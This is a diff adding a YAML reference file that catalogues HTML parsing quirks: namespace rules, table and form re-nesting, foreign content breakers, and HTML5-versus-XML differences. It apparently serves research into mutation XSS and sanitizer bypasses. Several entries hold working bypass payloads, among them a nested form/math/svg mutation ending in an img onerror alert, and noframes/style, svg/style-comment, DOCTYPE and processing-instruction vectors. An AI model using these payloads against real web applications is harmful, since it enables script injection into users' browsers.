@@ -1,0 +1,463 @@
+define: &content_breakers_searchterms
+  - breakers
+  - foreign content breakers
+  - math
+  - svg
+  - face
+  - color
+  - size
+  - div
+  - font
+  - head
+  - body
+  - b
+  - big
+  - blockquote
+  - body
+  - br
+  - center
+  - code
+  - dd
+  - div
+  - dl
+  - dt
+  - em
+  - embed
+  - h1
+  - h2
+  - h3
+  - h4
+  - h5
+  - h6
+  - head
+  - hr
+  - i
+  - img
+  - li
+  - listing
+  - menu
+  - meta
+  - nobr
+  - ol
+  - p
+  - pre
+  - ruby
+  - s
+  - small
+  - span
+  - strong
+  - strike
+  - sub
+  - sup
+  - table
+  - tt
+  - u
+  - ul
+  - var
+
+HTML namespace:
+  - title: "[Select](https://html.spec.whatwg.org/#parsing-main-inselect)"
+    search_terms:
+      - select
+      - input
+      - keygen
+      - textarea
+      - a
+    description: |
+      * Unwanted elements in select will get deleted, `<select><a>` → `<select>`
+      * Aside from `<select>`, `<input>`, `<keygen>` and `<textarea>`: `<select><style><input><a>` → `<select></select><input><a></a>`
+  - title: "[Form](https://html.spec.whatwg.org/#the-form-element)"
+    search_terms:
+      - nested
+      - form
+    description: |
+      * Cant have other form descendants, `<form id=form1>INSIDE_FORM1<form id=form2>INSIDE_FORM2` → `<form id="form1">INSIDE_FORM1 INSIDE_FORM2</form>`
+      * Bypass, `<form id="outer"><div></form><form id="inner"><input>` →  `<form id="outer"><div><form id="inner"><input></form></div></form>` → `<form id="outer"><div><input></div></form>`
+      * Can craft payloads that will mutate even after the second reparsing: `<form id="outer"><math><mtext></form><form id="inner"><mglyph><svg><mtext><form id="outer"><mi></form><form id="inner"><mglyph><desc><xmp><img src=x onerror=alert(1)>`
+  - title: "[Table](https://html.spec.whatwg.org/#the-table-element)"
+    search_terms:
+      - table
+      - p
+      - ul
+      - a
+    description: |
+      * Will move disallowed elements before, `<table><a>` → `<a></a><table></table>`
+      * Can be used to enclose disallowed elements in one another
+        * `<p><table><xmp>` →  `<p><xmp></xmp><table></table></p>` → `<p></p><xmp></xmp><table></table>`
+        * `<a><mglyph><table><a>` → `<a><mglyph><a></a><table></table></mglyph></a>` → `<a><mglyph></mglyph><a></a><table></table></a>`
+        * `<p><table><ul>` → `<p><ul></ul><table></table></p>` → `<p></p><ul></ul><table></table><p></p>`
+        * And more…
+      * Table elements such as `tbody`, `tr`,and `td` will be removed outside of the table
+
+  - title: "[a](https://html.spec.whatwg.org/#the-a-element)"
+    search_terms:
+      - a
+      - audio
+      - altglyphdef
+      - animatecolor
+      - filter
+      - fieldset
+      - table
+    description: |
+      * Cannot be the child of another a element. Bypass via table element: `<a id=1><table><a id=2>` → `<a id="1"><a id="2"></a><table></table></a>` → `<a id="1"></a><a id="2"></a><table></table>`
+      * Also `<a id=1><audio>aa<altglyphdef><animatecolor><filter><fieldset><a id=2></fieldset></a>`
+
+  - title: "[headings](https://html.spec.whatwg.org/#the-h1,-h2,-h3,-h4,-h5,-and-h6-elements)"
+    search_terms:
+      - h
+      - heading
+      - a
+    description: |
+      * Headers cant be direct childs e.g: `<h1><h2>` → `<h1></h1><h2></h2> ` 
+      * Bypass, `<h1><a><h2></a>` → `<h1><a></a><h2><a></a></h2></h1>` → `<h1><a></a></h1><h2><a></a></h2>`
+
+  - title: "[noscript](https://html.spec.whatwg.org/#the-noscript-element)"
+    search_terms:
+      - noscript
+      - scripting
+      - javascript
+    description: |
+      * Parsed differently when js is enabled or disabled. When parsing via DOMParser scripting is disabled
+      * Js enabled, `<noscript><a>` → `<noscript><a></noscript>`
+      * Js disabled, `<noscript><a>` → `<noscript><a></a></noscript>`
+
+  - title: "[br](https://html.spec.whatwg.org/#the-br-element) and[p](https://html.spec.whatwg.org/#the-p-element)"
+    search_terms:
+      - p
+      - br
+      - address
+      - article
+      - aside
+      - blockquote
+      - center
+      - details
+      - dialog
+      - dir
+      - div
+      - dl
+      - fieldset
+      - figcaption
+      - figure
+      - footer
+      - header
+      - hgroup
+      - main
+      - menu
+      - nav
+      - ol
+      - search
+      - section
+      - summary
+      - ul
+      - pre
+      - listing
+      - plaintext
+    description: |
+      * Are the only elements that can be created with an end tag, </p> → <p></p>
+      * Elements that end a `p` element: `address`, `article`, `aside`, `blockquote`, `center`, `details`, `dialog`, `dir`, `div`, `dl`, `fieldset`, `figcaption`, `figure`, `footer`, `header`, `hgroup`, `main`, `menu`, `nav`, `ol`, `p`, `search`, `section`, `summary`, `ul`, `pre`, `listing`, `plaintext`
+
+  - title: "[Plaintext](https://html.spec.whatwg.org/#plaintext-state)"
+    search_terms:
+      - plaintext
+    description: |
+      * `plaintext` can't be closed in HTML namespace but `<table><plaintext><a>` → `<plaintext><a></plaintext><table></table>` table will execute
+  
+  - title: "[Textarea](https://html.spec.whatwg.org/#the-textarea-element)"
+    search_terms:
+      - textarea
+      - encode
+      - comment
+    description: |
+      * Content will get decoded
+      * Comments will not be parsed in textarea: `<textarea><!-- test ->` → `<textarea> &lt;!--test--&gt;</textarea>`
+  
+  - title: "NULL byte"
+    search_terms:
+     - null byte
+     - \x00
+     - \0
+     - "00"
+    description: |
+      *  Will change to chr at 65533 in an element name
+      ```
+      a=new window.DOMParser().parseFromString(`<a\x00 id="test">`,"text/html");
+      a.querySelector(`#test`).tagName.substr(1).charCodeAt() == 65533;
+      >>> true
+      ```
+
+
+SVG namespace:
+  - title: "HTML integration points"
+    search_terms:
+      - foreignObject
+      - desc
+      - title
+      - svg
+      - integration point
+    description: |
+      * `foreignObject`, `desc`, and `title` elements
+  - title: "[image](https://html.spec.whatwg.org/#svg-image) element"
+    search_terms:
+      - foreign content breakers
+      - image
+      - svg
+      - img
+    description: |
+      * `image` is allowed in `svg` but in HTML it will change to `img`, which is a foreign content breaker
+
+
+MATHML namespace:
+  - title: "HTML integration points"
+    search_terms:
+      - mi
+      - mo
+      - mn
+      - ms
+      - mtext
+      - math
+      - integration point
+    description: |
+      * `mi`, `mo`, `mn`, `ms`, and `mtext` elements
+  - title: "[annotation-xml](https://www.w3.org/Math/draft-spec/chapter5.html#mixing.elements.annotation.xml) element"
+    search_terms:
+      - encoding
+      - annotation-xml
+      - math
+      - svg
+      - integration point
+    description: |
+      * Can embed SVG namespace in MathML only if it's a direct descendant of `annotation-xml`, or in an HTML integration point: `<math><annotation-xml><svg>` But not `<math><annotation-xml><x><svg>`
+      * Can be a text integration point if the `encoding` attribute is set to `text/html`
+  - title: "`mglyph`/`malignmark` [elements](https://html.spec.whatwg.org/#tree-construction)"
+    search_terms:
+      - mglyph
+      - malignmark
+      - math
+      - integration point
+      - mi
+      - mo
+      - mn
+      - ms
+      - mtext
+    description: |
+      * If either one of the `mglyph` or `malignmark` tags is a direct descendant of HTML integration point, the element (and its descendant) will be in MATHML namespace
+
+Foreign content breakers:
+  - title: "The following tags"
+    search_terms: *content_breakers_searchterms
+    description: |
+      * `b`, `big`, `blockquote`, `body`, `br`, `center`, `code`, `dd`, `div`, `dl`, `dt`, `em`, `embed`, `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `head`, `hr`, `i`, `img`, `li`, `listing`, `menu`, `meta`, `nobr`, `ol`, `p`, `pre`, `ruby`, `s`, `small`, `span`, `strong`, `strike`, `sub`, `sup`, `table`, `tt`, `u`, `ul`, `var`
+  - title: "The `font` element"
+    search_terms:
+      - breakers
+      - foreign content breakers
+      - math
+      - svg
+      - font
+      - face
+      - size
+      - color
+    description: |
+      * Is considered *“Breaking foreign content tags”* only with one of the attributes named `color`, `face`, or `size`
+  - title: "The `head` and `body` element"
+    search_terms:
+      - breakers
+      - foreign content breakers
+      - math
+      - svg
+      - head
+      - body
+    description: |
+      * Are also content breakers and disappear when rendering in the body, e.g.: `<svg><body><a>` → `<svg></svg><a></a>`
+
+Browser specific:
+  - title: "Document fragment parsing"
+    search_terms:
+      - document fragment
+      - browser specific
+      - parsing
+      - innerHTML
+      - insertAdjacentHTML
+      - iframe
+      - srcdoc
+      - firefox
+      - srcdoc
+      - *content_breakers_searchterms
+    description: |
+      * JavaScript functions that use fragment parsing
+        `innerHTML`, `insertAdjacentHTML`, etc.
+      * Non-fragment parsing examples
+        `iframe`'s srcdoc, document rendering
+      * Firefox 
+        `<svg><div>` → `<svg><div></div></svg>`  (not only `div` but rather all breaking foreign content elements)
+      * Others
+        `<svg><div>` → `<svg></svg><div></div>`  (same expected)
+
+HTML5 vs HTML4 / XML:
+  - title: "RCDATA/RAWTEXT elements"
+    search_terms:
+      - textarea
+      - title
+      - noframes
+      - noembed
+      - iframe
+      - xmp
+      - style
+      - noscript
+      - plaintext
+      - html4
+      - html5
+      - "4"
+      - "5"
+    description: |
+      * HTML introduced RCDATA/RAWTEXT type elements meaning if the sanitizer is using XML style parser, an attacker can use payload as such to bypass the sanitization `<noframes><style></noframes><xss></style></noframes>`
+
+  - title: "Comments"
+    search_terms:
+      - comments
+      - html4
+      - html5
+      - "4"
+      - "5"
+    description: |
+      * According to the XML specification (XHTML), comments must end with the characters `—>`. On the other hand, the HTML specification states that a comment's text "must not start with the string `>`, nor start with the string `->`".
+      ```html
+        Input: <!--><p>
+        HTML5 output: <!----><p></p>
+        HTML4 output: <!--><p>-->
+      ```
+      This can be done with either `<!-->` or `<!--->`.
+
+  - title: "Foreign content elements"
+    search_terms:
+      - foreign content
+      - math
+      - svg
+      - html4
+      - html5
+      - "4"
+      - "5"
+    description: |
+      * HTML5 introduced two foreign elements ([math](https://html.spec.whatwg.org/#mathml) and [svg](https://html.spec.whatwg.org/#svg-0)) which follow different parsing specifications than HTML. Again parsing with PHP doesn't take it into account, causing other parsing differentials and sanitizers bypass such as: `<svg><p><style><!--</style><xss>--></style>`
+    
+  - title: "DOCTYPE element"
+    search_terms:
+      - doctype
+      - xml
+      - html4
+      - html5
+      - "4"
+      - "5"
+    description: |
+      * The `!DOCTYPE` [element in XML/XHTML](https://www.w3.org/TR/xml/#NT-doctypedecl) is more complex allowing more characters and element nesting than in [HTML5](https://html.spec.whatwg.org/#the-doctype). In contrast, the HTML doctype ends with the [first occurrence](https://html.spec.whatwg.org/#doctype-state) of the "greater than" sign `>`.
+      The following payload can be used if the parser doesn't follow HTML5's DOCTYPE rules:
+      ``` html
+      <!DOCTYPE HTML PUBLIC "-//W3C//DTDHTML4.01//EN" "><xss>">
+      <!DOCTYPE HTML SYSTEM "><xss>">
+      ```
+
+  - title: "Element name starting with underscrool"
+    search_terms:
+      - xml
+      - html4
+      - html5
+      - "4"
+      - "5"
+    description: |
+      * According to the [XML specification](https://www.w3schools.com/xml/xml_elements.asp#:~:text=can%20have%20attributes.-,XML%20Naming%20Rules,-XML%20elements%20must) *"Element names must start with a letter or underscore"*, unlike [HTML](https://html.spec.whatwg.org/#syntax-tag-name) where tags must start with ASCII alphanumerics.
+      ```html
+      Input: <p><_test>/<p>
+      HTML output: <p>&lt;_test/&gt;/<p>
+      XML output: <p><_test/>/<p>
+      ```
+    
+  - title: "Processing instruction"
+    search_terms:
+      - processing instruction
+      - xml
+      - html4
+      - html5
+      - "4"
+      - "5"
+    description: |
+      * XML has implemented [Processing Instruction](https://en.wikipedia.org/wiki/Processing_Instruction) while HTML will create a comment if `?` follows an open tag chr `<`. The following payload can be used: `<?x --><xss> ?>` if the sanitizer accepts PI.
+
+Entities decoding:
+  - title: "In the content of noscript"
+    search_terms:
+      - entities decoding
+      - noscript
+      - decoding
+      - decode
+    description: |
+
+  - title: "In the content of `style` only in `svg`/`mathML` namespaces"
+    search_terms:
+      - entities decoding
+      - math
+      - style
+      - svg
+      - decoding
+      - decode
+    description: |
+
+Documentation links:
+  - title: "Integration points: [HTML Standard](https://html.spec.whatwg.org/#tree-construction)"
+    search_terms:
+      - documentation links
+      - links
+      - integration points
+      - mi
+      - mo
+      - mn
+      - ms
+      - mtext
+      - annotation-xml
+      - foreignObject
+      - desc
+      - title
+    description: |
+
+  - title: "Breaking foreign content tags: [HTML Standard](https://html.spec.whatwg.org/#parsing-main-inforeign)" 
+    search_terms:
+      - documentation links
+      - links
+      - breaking foreign content tags
+      - *content_breakers_searchterms
+    description: |
+
+  - title: "RCDATA/RAWTEXT elements: [HTML Standard](https://html.spec.whatwg.org/#parsing-html-fragments)"
+    search_terms:
+      - documentation links
+      - links
+      - raw text elements
+      - RCDATA elements
+      - title
+      - textarea
+      - style
+      - xmp
+      - iframe
+      - noembed
+      - noframes
+      - script
+      - noscript
+      - plaintext
+    description: |
+
+  - title: "Serializing HTML fragments: [HTML Standard](https://html.spec.whatwg.org/#serialising-html-fragments)"
+    search_terms:
+      - documentation links
+      - links
+      - serializing HTML 
+      - fragments
+    description: |
+
+  - title: "Element types: [HTML Standard](https://html.spec.whatwg.org/#elements-2)"
+    search_terms:
+      - documentation links
+      - links
+      - elements
+      - types
+    description: |
+      
+---
